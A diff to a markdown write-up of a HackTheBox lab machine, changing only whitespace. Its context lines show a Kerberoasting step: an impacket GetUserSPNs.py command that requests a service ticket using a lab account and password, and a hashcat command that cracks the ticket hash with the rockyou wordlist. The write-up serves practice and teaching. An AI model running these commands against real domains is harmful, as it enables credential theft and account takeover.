@@ -179,8 +179,8 @@ It even has its own feature to request a TGS! Let's use it then.
 ```
 impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 ACTIVE.HTB/SVC_TGS:GPPstillStandingStrong2k18
 ```
-
 > This will request a TGS (Ticket Granting Service) or The Silver Ticket for the user **SVC_TGS** complete with the password on **ACTIVE.HTB** domain.
+
 <br>
 <br>
 
@@ -210,6 +210,7 @@ hashcat -m 13100 -a 0 tgs /usr/share/wordlist/rockyou.txt
 ```
 > Basically, we want to crack a hash with the type ID of 13100 with the attack mode of zero, which is **straight** (a simple pick-one-and-try-next-if-fails from a wordlist), we're cracking the file called **tgs** with the wordlist **rockyou.txt**.
 > I hope that will clarify the syntax.
+
 <br>
 <br>
 
